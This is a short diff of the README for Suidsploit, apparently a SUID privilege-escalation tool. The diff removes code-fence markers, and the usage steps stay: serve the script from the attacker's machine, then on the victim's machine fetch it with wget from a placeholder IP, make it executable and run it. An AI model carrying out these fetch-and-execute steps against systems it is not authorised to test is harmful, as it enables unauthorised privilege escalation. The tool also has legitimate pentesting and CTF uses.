@@ -19,24 +19,21 @@ On your machine:
 - Download Suidsploit
 - Start a HTTP-Server
 
-'''sh
+
 $ git clone https://github.com/S1lkys/Suidsploit.git
 $ cd Suidsploit/
 $ python -m SimpleHTTPServer 80
-'''
+
 
 On victims machine:
 - download Suidsploit
 - make it executable
 - execute Suidsploit
 
-'''sh
+
 $ wget http://192.168.xxx.xxx/Suidsploit.ob.sh
-
 $ chmod +x Suidsploit.ob.sh
-
 $ bash Suidsploit.ob.sh
-'''
 ### Todos
 
 - Fix found Bugs
